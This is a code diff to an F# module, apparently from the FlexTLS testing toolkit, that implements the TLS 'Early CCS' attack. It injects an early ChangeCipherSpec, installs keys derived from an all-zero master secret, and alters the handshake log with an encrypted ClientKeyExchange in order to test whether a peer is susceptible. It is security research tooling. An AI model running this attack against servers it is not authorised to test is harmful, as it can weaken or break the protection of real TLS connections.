@@ -9,6 +9,7 @@ open TLSConstants
 open FlexTypes
 open FlexConstants
 open FlexConnection
+open FlexRecord
 open FlexClientHello
 open FlexServerHello
 open FlexCertificate
@@ -41,18 +42,29 @@ type Attack_EarlyCCS =
         let st,nsc,fcert = FlexCertificate.receive(st,Client,nsc) in
         let st,fshd      = FlexServerHelloDone.receive(st) in
 
-
         // Inject early CCS and start encrypting early
         let st,_         = FlexCCS.send(st) in
+
+        // We fill the master secret with zeros because it has no data from the KEX yet
+        // Then we compute and install the writing keys
         let nsc          = { nsc with ms = (Bytes.createBytes 48 0) } in
         let nsc          = FlexSecrets.fillSecrets(st,Client,nsc) in
         let st           = FlexState.installWriteKeys st nsc in
 
         // If this step go through, the peer is suceptible to the attack
-        // It should have thrown a "Unexpected message" fatal alert because of the early CCS
+        // It should throw a "Unexpected message" fatal alert because of the early CCS
+
+        // We compute the encrypted payload including the fragment header of the ClientKeyExchange but don't send it
+        let fckep,_,_,_  = FlexClientKeyExchange.prepareRSA(st,nsc,fch) in
+        let _,fckeencpwh = FlexRecord.encrypt(st.write.epoch,fsh.pv,st.write.record,Handshake,fckep) in
+        let _,fckeencp   = Bytes.split fckeencpwh 6 in
+
+
+        // We continue the usual handshake procedure
         let st,nsc,fcke  = FlexClientKeyExchange.sendRSA(st,nsc,fch) in
         
-        let log          = fch.payload @| fsh.payload @| fcert.payload @| fshd.payload  @| fcke.payload in
+        // Here instead of the usual plain ClientKeyExchange payload, we concatenate the encrypted one in the log
+        let log          = fch.payload @| fsh.payload @| fcert.payload @| fshd.payload @| fckeencpwh in
         let st,ffC       = FlexFinished.send(st,logRoleNSC=(log,Client,nsc)) in
         let st,_         = FlexCCS.receive(st) in
 
